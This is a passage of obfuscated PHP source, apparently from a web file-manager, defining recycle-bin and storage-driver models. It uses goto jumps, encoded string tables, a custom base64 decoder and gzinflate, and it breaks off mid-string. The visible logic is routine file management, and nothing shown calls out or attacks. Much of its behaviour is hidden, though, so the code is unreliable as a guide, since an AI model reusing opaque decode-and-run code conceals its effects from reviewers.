$´²Ô÷áì[$ú½…°ë[80]], $´²Ô÷áì[$ú½…°ë[514]]); return md5(implode($ú½…°ë[11], $óãŠ·)); } private static function localFilePath($ÜºßËµ¸, $ÍÃÚ´¸ü) { $¶€§ç©í =& $_SERVER[ê‘³Æ±]; if ($ÍÃÚ´¸ü == $¶€§ç©í[1190] && strtoupper(substr(PHP_OS, 0, 3)) == $¶€§ç©í[1191]) { return !1; } $…í¥Ó‰” = KodIO::parse($ÜºßËµ¸); if ($…í¥Ó‰”[$¶€§ç©í[33]] == KodIO::KOD_SOURCE) { $ŒË†áÊ = Model($¶€§ç©í[819])->fileInfoGet(KodIO::sourceID($ÜºßËµ¸)); if (!$ŒË†áÊ[$¶€§ç©í[78]]) { show_json($¶€§ç©í[1192], !1); } $ÜºßËµ¸ = $ŒË†áÊ[$¶€§ç©í[78]]; } $ü…ÀŒù = self::init($ÜºßËµ¸); if ($ü…ÀŒù->pathParse[$¶€§ç©í[1140]]) { $ÜºßËµ¸ = $ü…ÀŒù->pathParse[$¶€§ç©í[1140]]; $ü…ÀŒù = self::init($ÜºßËµ¸); } $ÒºŞî±Â = $ü…ÀŒù->getType(); if ($ÒºŞî±Â == $¶€§ç©í[107] || $ÒºŞî±Â == $¶€§ç©í[1193]) { if (!$ü…ÀŒù->exist($ü…ÀŒù->path)) { show_json(LNG($¶€§ç©í[106]), !1); } return $ü…ÀŒù->path; } return !1; } private static function archiveExt($º•’¸Ö¾ = '') { $GLOBALS[$_SERVER[ê‘³Æ±][1194]] = $º•’¸Ö¾; } } goto BÆÇÄ¢å¸; DŒì„ğ±®: define($_SERVER[ê‘³Æ±][238], 1); define($_SERVER[ê‘³Æ±][239], 0); define($_SERVER[ê‘³Æ±][240], 2); goto aâ¤ ¹±Ä´; cæË–„õÇ³: define($_SERVER[ê‘³Æ±][0], $_SERVER[ê‘³Æ±][1]); $_SERVER[÷³Ü•®ä] = explode($_SERVER[ê‘³Æ±][2], gzinflate(substr($_SERVER[ê‘³Æ±][3], 10, -8))); function binCheckEq($˜¸ú¼ß, $ÚÚëåÉå) { return $˜¸ú¼ß == $ÚÚëåÉå; } goto C‘î¹ÏÙñ—; aˆ—‹èö×ñ: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\x75\162\143\145\137\162\x65\143\171\143\x6c\145"; protected $dataAuto = array(array("\x63\x72\x65\141\164\145\x54\151\x6d\x65", "\164\x69\x6d\x65", "\151\x6e\x73\145\162\x74", "\x66\x75\x6e\143\164\x69\x6f\x6e")); public function listData($ä¤ŠÜòŠ = false) { $óÃ‘îùÚ =& $_SERVER[ê‘³Æ±]; $ä¤ŠÜòŠ = $ä¤ŠÜòŠ ? $ä¤ŠÜòŠ : USER_ID; $ÊÓ—àìÍ = $this->where(array($óÃ‘îùÚ[1632] => $ä¤ŠÜòŠ))->select(); return array_to_keyvalue($ÊÓ—àìÍ, $óÃ‘îùÚ[12], $óÃ‘îùÚ[396]); } public function moveToRecycle($÷èå¶ŞÏ) { $¥ëëÊÕŒ =& $_SERVER[ê‘³Æ±]; $ôã¥âöˆ = Model($¥ëëÊÕŒ[1314]); $îé×¿×‚ = $ôã¥âöˆ->sourceInfo($÷èå¶ŞÏ); if (!$îé×¿×‚ || $îé×¿×‚[$¥ëëÊÕŒ[424]] == $¥ëëÊÕŒ[89]) { return; } $èµ­¸ = array($¥ëëÊÕŒ[411] => $÷èå¶ŞÏ, $¥ëëÊÕŒ[1632] => USER_ID, $¥ëëÊÕŒ[576] => $îé×¿×‚[$¥ëëÊÕŒ[405]], $¥ëëÊÕŒ[577] => $îé×¿×‚[$¥ëëÊÕŒ[498]], $¥ëëÊÕŒ[580] => $îé×¿×‚[$¥ëëÊÕŒ[514]]); $this->add($èµ­¸); $this->recycleMove($÷èå¶ŞÏ, 1); if ($îé×¿×‚[$¥ëëÊÕŒ[404]] == $¥ëëÊÕŒ[89]) { $˜æ³À‹ü = array($¥ëëÊÕŒ[580] => array($¥ëëÊÕŒ[540], $îé×¿×‚[$¥ëëÊÕŒ[514]] . $÷èå¶ŞÏ . $¥ëëÊÕŒ[541])); $ôã¥âöˆ->where($˜æ³À‹ü)->setField($¥ëëÊÕŒ[424], 1); } } public function clear() { $this->remove(!1); } public function remove($ÉÂ¶ùß = false, $¤¾ùç›­ = false) { $Õ®íÂõ¼ =& $_SERVER[ê‘³Æ±]; $¤¾ùç›­ = $¤¾ùç›­ ? $¤¾ùç›­ : USER_ID; $¨Àıãğî = Model($Õ®íÂõ¼[1314]); $¾úµùü = $this->listData($¤¾ùç›­); $ÉÂ¶ùß = $ÉÂ¶ùß === !1 ? !1 : $ÉÂ¶ùß; $Ï½âŠ¶§ = array(); foreach ($¾úµùü as $­ë³×ÎÄ) { if ($ÉÂ¶ùß != !1 && !in_array($­ë³×ÎÄ, $ÉÂ¶ùß)) { continue; } $éßÎü¶š = $¨Àıãğî->sourceInfo($­ë³×ÎÄ); $¨Àıãğî->remove($­ë³×ÎÄ, !1); $¶Æšù˜Â = $éßÎü¶š[$Õ®íÂõ¼[405]] . $Õ®íÂõ¼[11] . $éßÎü¶š[$Õ®íÂõ¼[498]]; $Ï½âŠ¶§[$¶Æšù˜Â] = array($Õ®íÂõ¼[576] => $éßÎü¶š[$Õ®íÂõ¼[405]], $Õ®íÂõ¼[498] => $éßÎü¶š[$Õ®íÂõ¼[498]]); $this->where(array($Õ®íÂõ¼[396] => $­ë³×ÎÄ))->delete(); } foreach ($Ï½âŠ¶§ as $×ßîğŒ) { $¨Àıãğî->targetSpaceUpdate($×ßîğŒ[$Õ®íÂõ¼[405]], $×ßîğŒ[$Õ®íÂõ¼[498]]); } } public function restore($ìÄ½Ïİ = false) { $Ê±Ì¿¹ = $this->listData(); $this->_restoreSource($Ê±Ì¿¹, $ìÄ½Ïİ); } public function removeUserAll($Ö‘® åÆ) { $this->remove(!1, $Ö‘® åÆ); } private function _restoreSource($âÉìß˜, $Ø‡±ñ—) { $®•«Ô²Î =& $_SERVER[ê‘³Æ±]; $Ğ¬Ğàä = Model($®•«Ô²Î[1314]); $Ø‡±ñ— = $Ø‡±ñ— == !1 ? !1 : $Ø‡±ñ—; if (!$âÉìß˜) { return !0; } $Ò¸ÂÌÄœ = array(); foreach ($âÉìß˜ as $ù¼‘Œœ¯) { if ($Ø‡±ñ— != !1 && !in_array($ù¼‘Œœ¯, $Ø‡±ñ—)) { continue; } $Ò‡¶«œÂ = $Ğ¬Ğàä->sourceInfo($ù¼‘Œœ¯); $ïƒ•Ïª¾ = $Ğ¬Ğàä->sourceInfo($Ò‡¶«œÂ[$®•«Ô²Î[491]]); if ($ïƒ•Ïª¾[$®•«Ô²Î[424]] == $®•«Ô²Î[89]) { continue; } $Ğ¬Ğàä->lockMoveStart($ù¼‘Œœ¯); $this->recycleMove($ù¼‘Œœ¯, 0); if ($Ò‡¶«œÂ[$®•«Ô²Î[404]] == $®•«Ô²Î[89]) { $Ç¿Áï¬İ = array($®•«Ô²Î[580] => array($®•«Ô²Î[540], $Ò‡¶«œÂ[$®•«Ô²Î[514]] . $ù¼‘Œœ¯ . $®•«Ô²Î[541])); $Ğ¬Ğàä->where($Ç¿Áï¬İ)->setField($®•«Ô²Î[424], 0); $this->restoreFolderChildren($ù¼‘Œœ¯, $âÉìß˜); } $this->where(array($®•«Ô²Î[396] => $ù¼‘Œœ¯))->delete(); $Ğ¬Ğàä->folderSizeReset($Ò‡¶«œÂ[$®•«Ô²Î[491]]); $Ò¸ÂÌÄœ[] = $Ò‡¶«œÂ[$®•«Ô²Î[491]]; if ($Ò‡¶«œÂ[$®•«Ô²Î[404]] == $®•«Ô²Î[89]) { $Ò¸ÂÌÄœ[] = $ù¼‘Œœ¯; } $Ğ¬Ğàä->lockMoveEnd($ù¼‘Œœ¯); } $Ğ¬Ğàä->updateModifyTime($Ò¸ÂÌÄœ); } private function restoreFolderChildren($Õ€Š©Ò, $Æ†¯ª‡ß) { $Õ€‘şøÙ =& $_SERVER[ê‘³Æ±]; $Ò›¡†İ = Model($Õ€‘şøÙ[1314]); $÷³øÄ£ä = array($Õ€‘şøÙ[396] => array($Õ€‘şøÙ[7], array())); foreach ($Æ†¯ª‡ß as $½õ§ğÔò) { if ($½õ§ğÔò == $Õ€Š©Ò) { continue; } if (!$Ò›¡†İ->isParentOf($Õ€Š©Ò, $½õ§ğÔò)) { continue; } $ı™´İŞ¤ = $Ò›¡†İ->sourceInfo($½õ§ğÔò); if ($ı™´İŞ¤[$Õ€‘şøÙ[404]] == $Õ€‘şøÙ[89]) { $÷³øÄ£ä[] = array($Õ€‘şøÙ[580] => array($Õ€‘şøÙ[540], $ı™´İŞ¤[$Õ€‘şøÙ[514]] . $½õ§ğÔò . $Õ€‘şøÙ[541])); } else { $÷³øÄ£ä[$Õ€‘şøÙ[396]][1][] = $½õ§ğÔò; } } if (!$÷³øÄ£ä[$Õ€‘şøÙ[396]][1]) { unset($÷³øÄ£ä[$Õ€‘şøÙ[396]]); } if (!$÷³øÄ£ä) { return; } $÷³øÄ£ä[$Õ€‘şøÙ[396]][1] = array_unique($÷³øÄ£ä[$Õ€‘şøÙ[396]][1]); $÷³øÄ£ä[$Õ€‘şøÙ[989]] = $Õ€‘şøÙ[1904]; $Ò›¡†İ->where($÷³øÄ£ä)->setField($Õ€‘şøÙ[424], 1); } private function recycleMove($¦œê²†õ, $ñÇÑ•· = 1) { $‰ö»ÂÅ¬ =& $_SERVER[ê‘³Æ±]; $®³áµì = Model($‰ö»ÂÅ¬[1314]); $·ÒÍÇÊô = Model($‰ö»ÂÅ¬[2110]); $ÂÆş´ˆ¥ = array($‰ö»ÂÅ¬[396] => $¦œê²†õ); if ($ñÇÑ•·) { $®³áµì->where($ÂÆş´ˆ¥)->setField($‰ö»ÂÅ¬[424], 1); $·ÒÍÇÊô->eventRecycle($¦œê²†õ, $‰ö»ÂÅ¬[2111]); } else { $êáØò–® = $®³áµì->where($ÂÆş´ˆ¥)->find(); $ú‘ª¿Ê = $êáØò–®[$‰ö»ÂÅ¬[404]] == $‰ö»ÂÅ¬[89]; $‚ø´ıØÇ = $®³áµì->fileNameAuto($êáØò–®[$‰ö»ÂÅ¬[491]], $êáØò–®[$‰ö»ÂÅ¬[32]], REPEAT_RENAME_FOLDER, $ú‘ª¿Ê); if ($‚ø´ıØÇ != $êáØò–®[$‰ö»ÂÅ¬[32]]) { $®³áµì->rename($¦œê²†õ, $‚ø´ıØÇ); } $®³áµì->where($ÂÆş´ˆ¥)->setField($‰ö»ÂÅ¬[424], 0); $·ÒÍÇÊô->eventRecycle($¦œê²†õ, $‰ö»ÂÅ¬[2112]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\56\163\x6f\165\162\x63\x65\123\x65\x63\x72\145\x74\114\151\x73\164"; public $field = array("\163\157\165\x72\143\145\x49\104", "\x74\171\160\x65\111\104", "\x63\x72\x65\x61\164\x65\x55\x73\x65\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\56\x73\x74\157\x72\x61\x67\x65\x4c\x69\x73\x74"; public $field = array("\156\141\155\x65", "\163\x69\x7a\145\115\141\x78", "\163\171\163\164\145\x6d", "\144\x65\x66\x61\x75\154\164", "\144\162\151\166\x65\x72", "\143\x6f\x6e\x66\x69\x67"); public function listData($ßÊò›—¬ = false, $Ã ®¿ÎÌ = "\155\x6f\144\151\146\x79\124\x69\x6d\x65", $°‹–¡ÔĞ = false) { $¡ÆŸ˜ıš =& $_SERVER[ê‘³Æ±]; $Û§æñ›© = parent::listData($ßÊò›—¬, $Ã ®¿ÎÌ, $°‹–¡ÔĞ); if ($ßÊò›—¬) { return $Û§æñ›©; } $ÕçŞøëò = $this->ioSizeUseGet(array_to_keyvalue($Û§æñ›©, $¡ÆŸ˜ıš[12], $¡ÆŸ˜ıš[394])); foreach ($Û§æñ›© as $œà«ı¬ => $¤ìïä› ) { unset($Û§æñ›©[$œà«ı¬][$¡ÆŸ˜ıš[6]]); $Û§æñ›©[$œà«ı¬][$¡ÆŸ˜ıš[1798]] = isset($ÕçŞøëò[$¤ìïä› [$¡ÆŸ˜ıš[394]]]) ? $ÕçŞøëò[$¤ìïä› [$¡ÆŸ˜ıš[394]]] : 0; } return $Û§æñ›©; } public function ioSizeUseGet($¦Ó•‚§ë) { $œÁ©ø ¾ =& $_SERVER[ê‘³Æ±]; if (!$¦Ó•‚§ë) { return array(); } $¯îö‘Ş¾ = $œÁ©ø ¾[2113] . implode($œÁ©ø ¾[50], $¦Ó•‚§ë); $ª‡ü = Cache::get($¯îö‘Ş¾); if ($ª‡ü) { return $ª‡ü; } $ŞÑ€Ğ’ = array($œÁ©ø ¾[811] => $œÁ©ø ¾[394], $œÁ©ø ¾[2114] => $œÁ©ø ¾[80]); $µõÍºù¡ = array($œÁ©ø ¾[811] => array($œÁ©ø ¾[7], $¦Ó•‚§ë)); $ª‡ü = Model($œÁ©ø ¾[775])->field($ŞÑ€Ğ’)->where($µõÍºù¡)->group($œÁ©ø ¾[811])->select(); $ª‡ü = array_to_keyvalue($ª‡ü, $œÁ©ø ¾[394], $œÁ©ø ¾[80]); Cache::set($¯îö‘Ş¾, $ª‡ü, 600); return $ª‡ü; } public function getConfig($Ş½ƒ˜Ò) { $Ö­½Âá = parent::listData($Ş½ƒ˜Ò); return json_decode($Ö­½Âá[$_SERVER[ê‘³Æ±][6]], !0); } public function update($Œºëªåî, $ô–×­Ù˜) { $Áü°çÓ¢ =& $_SERVER[ê‘³Æ±]; $¥®ÛÀµà = $ô–×­Ù˜[$Áü°çÓ¢[32]]; $ù±İçƒó = array_to_keyvalue(parent::listData(), $Áü°çÓ¢[32]); if (isset($ù±İçƒó[$¥®ÛÀµà]) && $ù±İçƒó[$¥®ÛÀµà][$Áü°çÓ¢[394]] != $Œºëªåî) { return !1; } if (isset($ô–×­Ù˜[$Áü°çÓ¢[2115]]) && $ô–×­Ù˜[$Áü°çÓ¢[2115]] == $Áü°çÓ¢[89]) { $this->checkConfig($ô–×­Ù˜); } unset($ô–×­Ù˜[$Áü°çÓ¢[2115]]); $‰ôöÆˆ = parent::update($Œºëªåî, $ô–×­Ù˜); if ($‰ôöÆˆ && $ô–×­Ù˜[$Áü°çÓ¢[37]]) { foreach ($ù±İçƒó as $›™°¹æÒ) { if ($›™°¹æÒ[$Áü°çÓ¢[37]] && $›™°¹æÒ[$Áü°çÓ¢[394]] != $Œºëªåî) { parent::update($›™°¹æÒ[$Áü°çÓ¢[394]], array($Áü°çÓ¢[37] => 0)); } } } return $‰ôöÆˆ; } public function add($µîªÛ—) { $Üš‡š†ò =& $_SERVER[ê‘³Æ±]; $Àêê„Ã± = array_to_keyvalue(parent::listData(), $Üš‡š†ò[32]); if (isset($Àêê„Ã±[$µîªÛ—[$Üš‡š†ò[32]]])) { return !1; } $this->checkConfig($µîªÛ—); $ääİ·â£ = parent::insert($µîªÛ—); if ($ääİ·â£ && $µîªÛ—[$Üš‡š†ò[37]]) { foreach ($Àêê„Ã± as $¤ŒÎ–·À) { if ($¤ŒÎ–·À[$Üš‡š†ò[37]]) { parent::update($¤ŒÎ–·À[$Üš‡š†ò[394]], array($Üš‡š†ò[37] => 0)); } } } return $ääİ·â£; } public function checkConfig(&$¦ş·Ş, $†ø“ãöÒ = false) { $Ô£ºÎï¦ =& $_SERVER[ê‘³Æ±]; $‰ÁĞÛ’Ÿ = strtolower($¦ş·Ş[$Ô£ºÎï¦[96]]); $şÉ®Óœ˜ = json_decode($¦ş·Ş[$Ô£ºÎï¦[6]], !0); foreach ($şÉ®Óœ˜ as $ÎûÄÇßğ => $—ˆ¨´£ç) { $şÉ®Óœ˜[$ÎûÄÇßğ] = trim($—ˆ¨´£ç); } $şÉ®Óœ˜[$Ô£ºÎï¦[2116]] = rand_string(6); $‘«ö¾£Á = $GLOBALS[$Ô£ºÎï¦[6]][$Ô£ºÎï¦[90]][$Ô£ºÎï¦[820]]; $‚¢Á¿Èç = isset($‘«ö¾£Á[$‰ÁĞÛ’Ÿ]) ? $‘«ö¾£Á[$‰ÁĞÛ’Ÿ] : ucfirst($‰ÁĞÛ’Ÿ); $ƒúş¸‘‚ = $Ô£ºÎï¦[74] . $‚¢Á¿Èç; if (!$‚¢Á¿Èç || !class_exists($ƒúş¸‘‚)) { if ($†ø“ãöÒ) { return LNG($Ô£ºÎï¦[2117]); } write_log(array($Ô£ºÎï¦[2118], $¦ş·Ş, get_caller_info()), $Ô£ºÎï¦[2119]); show_json(LNG($Ô£ºÎï¦[2117]), !1, $¦ş·Ş); } $¬Ñ˜¾¿ = new $ƒúş¸‘‚($şÉ®Óœ˜); if (in_array($‰ÁĞÛ’Ÿ, $¬Ñ˜¾¿->objectDriver)) { if (!$¬Ñ˜¾¿->isBucketCors() && !$¬Ñ˜¾¿->setBucketCors()) { $Ü¯ß©¤Å = LNG($Ô£ºÎï¦[2120]); $Ü¯ß©¤Å .= $Ô£ºÎï¦[2121] . LNG($Ô£ºÎï¦[2122]); if ($†ø“ãöÒ) { return $Ü¯ß©¤Å; } show_json($Ü¯ß©¤Å, !1); } } $ŒÏŞØŠ… = rtrim($şÉ®Óœ˜[$Ô£ºÎï¦[1168]], $Ô£ºÎï¦[8]) . $Ô£ºÎï¦[8]; $Ÿú÷ı€» = $¬Ñ˜¾¿->getPath($ŒÏŞØŠ… . $Ô£ºÎï¦[1230]); if (!$¬Ñ˜¾¿->mkfile($Ÿú÷ı€»)) { if ($†ø“ãöÒ) { return LNG($Ô£ºÎï¦[2120]); } show_json(LNG($Ô£ºÎï¦[2120]), !1); } $şÉ®Óœ˜[$Ô£ºÎï¦[1168]] = $ŒÏŞØŠ…; $¦ş·Ş[$Ô£ºÎï¦[6]] = json_encode($şÉ®Óœ˜); $¦ş·Ş[$Ô£ºÎï¦[96]] = $‚¢Á¿Èç; return !0; } public function driverListSystem() { $ËÖ“†¨å =& $_SERVER[ê‘³Æ±]; $´ÔËğ­ = parent::listData(); $‡ò‡Ñ = array(); foreach ($´ÔËğ­ as $ãğ¿øé’) { unset($ãğ¿øé’[$ËÖ“†¨å[195]], $ãğ¿øé’[$ËÖ“†¨å[86]]); $ãğ¿øé’[$ËÖ“†¨å[6]] = json_decode($ãğ¿øé’[$ËÖ“†¨å[6]], !0); $‡ò‡Ñ[] = $ãğ¿øé’; } return $‡ò‡Ñ; } public function defaultDriver() { $ÙæµéØö =& $_SERVER[ê‘³Æ±]; $ğŞøÛø = parent::listData(); $Ğş¾à¨å = array_filter_by_field($ğŞøÛø, $ÙæµéØö[37], 1); $Ğş¾à¨å = $Ğş¾à¨å[0]; if ($Ğş¾à¨å) { $Ğş¾à¨å[$ÙæµéØö[6]] = json_decode($Ğş¾à¨å[$ÙæµéØö[6]], !0); } return $Ğş¾à¨å; } public function driverInfo($•¶ş’õ ) { $‡Ãöíêî =& $_SERVER[ê‘³Æ±]; $¦­…Öó = array_to_keyvalue(parent::listData(), $‡Ãöíêî[394]); if (!isset($¦­…Öó[$•¶ş’õ ])) { return !1; } $‹ òª÷ = $¦­…Öó[$•¶ş’õ ]; $‹ òª÷[$‡Ãöíêî[6]] = json_decode($‹ òª÷[$‡Ãöíêî[6]], !0); return $‹ òª÷; } public function remove($ùáüÙğ) { $this->removeShareItems($ùáüÙğ); return parent::remove($ùáüÙğ); } public function removeWithFile($”°…ğÆĞ, $ÏúÔÂçË) { $–Ó­÷ŠŸ =& $_SERVER[ê‘³Æ±]; $Ç®ÀºŠœ = array($–Ó­÷ŠŸ[811] => $”°…ğÆĞ); $•ßøşÖ  = Model($–Ó­÷ŠŸ[463])->where($Ç®ÀºŠœ)->count(); $°è˜§£ = Model($–Ó­÷ŠŸ[463])->where($Ç®ÀºŠœ)->sum($–Ó­÷ŠŸ[80]); $ã·‚—¼ = $ÏúÔÂçË . $–Ó­÷ŠŸ[2123] . $”°…ğÆĞ; $ëÈğö¢ø = LNG($ÏúÔÂçË == $–Ó­÷ŠŸ[547] ? $–Ó­÷ŠŸ[2124] : $–Ó­÷ŠŸ[2125]); $Ûôøáñ¯ = new TaskFileTransfer($ã·‚—¼, $–Ó­÷ŠŸ[2119], $•ßøşÖ , $ëÈğö¢ø . "\x28{$”°…ğÆĞ}\x29"); $Ûôøáñ¯->task[$–Ó­÷ŠŸ[749]] = (double) $°è˜§£; $ïí•øÖ¬ = KodIO::defaultDriver(); $ê“í‹£€ = $ïí•øÖ¬[$–Ó­÷ŠŸ[394]]; $•Û¤ÖºÖ = "\x7b\151\157\72{$ê“í‹£€}\x7d\57"; $ñÕİÃ§’ = !0; $úìÉœÁ = array(); $û®ºÉ = Model($–Ó­÷ŠŸ[194])->where($Ç®ÀºŠœ)->field($–Ó­÷ŠŸ[2126])->select(); foreach ($û®ºÉ as $Öû†Æİï) { $„ïÄÁâ = $Öû†Æİï[$–Ó­÷ŠŸ[78]]; $ˆÇ×ã’Â = $•Û¤ÖºÖ . str_replace("\x7b\x69\x6f\x3a{$”°…ğÆĞ}\x7d\57", $–Ó­÷ŠŸ[12], $„ïÄÁâ); if (!IO::exist($„ïÄÁâ)) { $úìÉœÁ[] = $Öû†Æİï[$–Ó­÷ŠŸ[460]]; $Ûôøáñ¯->updateFileEnd($Öû†Æİï[$–Ó­÷ŠŸ[32]], $Öû†Æİï[$–Ó­÷ŠŸ[80]]); continue; } if (IO::exist($ˆÇ×ã’Â)) { $Ûôøáñ¯->updateFileEnd($Öû†Æİï[$–Ó­÷ŠŸ[32]], $Öû†Æİï[$–Ó­÷ŠŸ[80]]); continue; } if (!IO::move($„ïÄÁâ, get_path_father($ˆÇ×ã’Â))) { $ñÕİÃ§’ = !1; break; } $Ç®ÀºŠœ = array($–Ó­÷ŠŸ[460] => $Öû†Æİï[$–Ó­÷ŠŸ[460]]); $é±çÕïµ = array($–Ó­÷ŠŸ[811] => $ê“í‹£€, $–Ó­÷ŠŸ[78] => $ˆÇ×ã’Â); Model($–Ó­÷ŠŸ[194])->where($Ç®ÀºŠœ)->save($é±çÕïµ); } $this->removeByFileID($úìÉœÁ); if (!$ñÕİÃ§’) { $Ûôøáñ¯->stop($ã·‚—¼); return !1; } $Ûôøáñ¯->end(); if ($ÏúÔÂçË == $–Ó­÷ŠŸ[1778]) { $this->remove($”°…ğÆĞ); } } public function progress($ûğÆ…Ê, $ğ‡Í’õÙ) { return Task::get($ğ‡Í’õÙ . $_SERVER[ê‘³Æ±][2123] . $ûğÆ…Ê); } private function removeByFileID($Õ¸•Ìì¬ = array()) { $ù¿ÎÒò =& $_SERVER[ê‘³Æ±]; if (empty($Õ¸•Ìì¬)) { return; } $ïâÇ©Ì± = array($ù¿ÎÒò[460] => array($ù¿ÎÒò[7], $Õ¸•Ìì¬)); $Ï…¹†ä = Model($ù¿ÎÒò[1314])->where($ïâÇ©Ì±)->field($ù¿ÎÒò[396])->select(); if (!$Ï…¹†ä) { return; } $Ï…¹†ä = array_to_keyvalue($Ï…¹†ä, $ù¿ÎÒò[12], $ù¿ÎÒò[396]); foreach ($Ï…¹†ä as $š¡«ß–’) { Model($ù¿ÎÒò[410])->removeNow($š¡«ß–’, !1); } } private function removeShareItems($¹ÂÀÛÅ) { $¾ÂòÁä× =& $_SERVER[ê‘³Æ±]; $§ÍÕ–ùä = "\x7b\151\157\x3a{$¹ÂÀÛÅ}\x7d\x2f"; $ŒƒÏìçê = array($¾ÂòÁä×[396] => 0, $¾ÂòÁä×[1163] => array($¾ÂòÁä×[380], "{$§ÍÕ–ùä}\x25")); $à»½˜­˜ = Model($¾ÂòÁä×[1789])->where($ŒƒÏìçê)->field($¾ÂòÁä×[481])->select(); if (empty($à»½˜­˜)) { return; } $»šÖÊò = array_to_keyvalue($à»½˜­˜, $¾ÂòÁä×[12], $¾ÂòÁä×[481]); Model($¾ÂòÁä×[591])->remove($»šÖÊò); } } goto aê‹öç×æØ; dÊ¿¸ä°ã: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(base64_decode('6pGzxrGe'), _kodDe('MqSCc+Svzg==')); $_SERVER[ê‘³Æ±] = explode("\174\2\174\1\174\4", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\11\170\33\325\325\150\130\113\50\133\131\132\50\205\16\206\140\307\321\142\147\217\23\307\310\266\154\53\221\55\43\311\44\41\66"."\312\110\32\133\23\113\32\171\146\344\55\11\77\224\65\4\10\224\35\122\112\130\302\326\204\255\254\41\5\132\372\103\11\133\241\320\224\122\340\101\234\4\10\244\55\245\145".base64_decode('bd9dzl1mJMP/vve+7+VLorvPXc4995xzzzn3Xw+8edWm7Sv3XrnXyn0f/sPbv70=')."\375\153\32\136\271\317\312\375\320\57\11\377\170\315\1\23\310\237\43\326\134\124\125\325\66\363\300\51\35\7\255\375\345\106\165\223\272\121\275\70\22\336\372\174\350\340\27"."\177\261\40\270\343\226\255\43\73\366\232\360\332\327\277\273\246\16\25\246\165\353\350\217\222\67\154\105\33\326\55\333\242\11\51\43\337\253\367\321\260\236\247\277\176\372\323".base64_decode('FQ2bWs6wNRr10Z8E9Iv8bw1kdZaf6IjEE7Guzs5gNA6F6uT8nJGGUEE11Rx8v6A=').base64_decode('mRbqjdxcomAUtLwjRSSkVVtNqha01NyYaA52hiNLEvElnUEokUwMFDVzhMZIMGY=')."\253\246\35\327\163\32\57\61\144\362\176\65\6\133\103\35\112\74\32\350\210\5\232\342\241\110\7\115\156\212\264\267\207\342\245\351\321\110\70\334\30\150\132\130\232\323\31"."\xd\xb4\xb6\x7\x14\xd4\xbf\xac\x96\xd0\xf3\xbd\x46\x95\xb2\x8c\xe6\x2c\x53\x26\xd3\x40\x8b\xae\x65\xd3\x34\x98\x57\x59\x77\xec\x91\x2\x84\xe2\x3c\x84\x96\x29\x5f\xcc\x66\x69\xa4\x83\x87"."\xd2\x5a\xaf\x5a\xcc\xc2\x6c\x35\xcb\x91\x82\xa9\xe7\x54\x36\xe8\x85\xda\x8\x4f\xa5\x1\xb5\x68\x1b\x7a\x3e\x45\x23\xc1\x61\xdb\x54\x45\x3a\xea\x6b\xa\x2d\xb4\x96\x87\xa6\x62\xc1\x70\xb0".base64_decode('Ka7gDiot0Ui7AouQUy1bM5VFbcFoUMGdrq8kY61UAF460FQogXBYGa8FW8sVWDM=')."\xb4\x4e\x99\xc6\x22\xd1\xe6\x60\x54\x69\x5c\xa2\x88\x19\x4a\x19\xb9\x9c\x91\xf7\xa1\x56\xd0\x4a\xda\x52\x57\x83\xd1\x28\xd\x78\x0\xbc\xc3\x21\xbc\x68\x10\x89\xb4\xb4\xc4\x82\x3c\x6\x83"."\73\65\214\172\62\15\340\323\21\113\367\146\355\304\240\232\55\62\60\355\247\277\225\360\3\277\206\5\240\73\240\347\365\42\200\51\64\141\30\174\133\101\240\310\112\153\54"."\105\113\103\40\207\352\33\260\363\320\66\34\244\301\372\371\364\167\56\24\112\46\160\236\146\332\11\55\237\62\322\172\36\66\153\3\0\235\152\147\232\115\35\25\200\226\14"."\137\312\50\214\264\33\203\60\212\136\75\253\205\371\16\353\65\262\151\315\24\361\2\252\56\347\300\160\364\121\251\166\107\61\47\27\341\321\124\106\317\246\115\266\61\277\251"."\x24\xda\xfa\x7a\xef\x88\xd8\x80\x96\x51\x34\x53\x5a\x8\x6d\x11\x51\xb7\x93\xf7\xa4\x16\xa\x69\xb6\x8d\x46\x6b\xb1\x71\x75\x15\xb2\x86\x9a\x8e\x69\xa6\x34\xd6\x16\x54\x31\x52\xb4\xe5\xc4"."\42\51\326\142\230\271\146\204\52\340\373\150\233\350\135\145\62\372\331\106\111\113\123\350\257\132\172\266\367\337\75\113\117\101\377\115\6\134\330\15\175\312\150\331\154\102\33".strrev('K/ ;wg|æØ2öZlPÅ©Œôö™Z£"H¡£B”~óÔ•¿H6,3Òå\'`Ö')."\207\141\7\45\104\235\65\122\152\126\36\42\15\147\154\273\20\323\362\151\74\23\60\24\143\50\117\146\252\240\151\120\250\331\243\244\225\166\145\211\322\126\247\327\131\254\142".strrev('Ë,Ò• ~¡SSlµíšÙHß¼ÖÕ)êÈP¤8Q9Ù$'."\r".'/t•0ö‰âÍ<tlCË.').base64_decode('22TkbdPIegPZrDHkjZh6n56vU6oB16JMtKe9GP/VwUatmKtgsMBIoLq+aPd6Z7M=').strrev('ö,ÔİŠÃ=|Ñ#TÕ¶Õê÷qÒÃ[¬Ö+ ‘Æº‚F6oLÕêŞj›KÈ'."\r".'').base64_decode('faW1PQ4NoRqat9NU+3JqnVIoJtFoYfOVSaOlYbh1SgpHPUquaNleU0PYRUcnGKw=')."\124\250\327\333\216\167\206\256\245\275\61\204\204\41\171\132\315\164\5\55\276\302\362\150\152\133\74\336\231\10\265\240\123\266\43\230\150\17\304\233\332\240\333\266\332\307\372"."\x1c\x46\xa8\x95\x37\xc9\x12\x17\x7b\xd1\xe\xc1\xe0\xd1\x81\xc6\x2a\x12\x3b\x8d\x21\xcd\x44\x1f\x6e\x1c\xa9\x53\xfa\x8d\x74\xd2\x18\xf6\xb1\x2c\x5c\x38\x86\x50\x0\x2b\x8c\x97\xb0\x60\x7b"."\243\152\276\17\317\117\162\304\326\0\210\254\301\76\347\144\207\265\174\237\235\141\25\143\301\350\151\301\150\42\26\151\211\57\12\104\341\174\316\243\225\37\146\237\302\115\147"."\xbd\x51\x2d\x8d\xa6\x3e\x65\xb3\x7a\x6a\x1\xcf\x1a\x2b\x83\xc1\x1b\xaf\x15\xc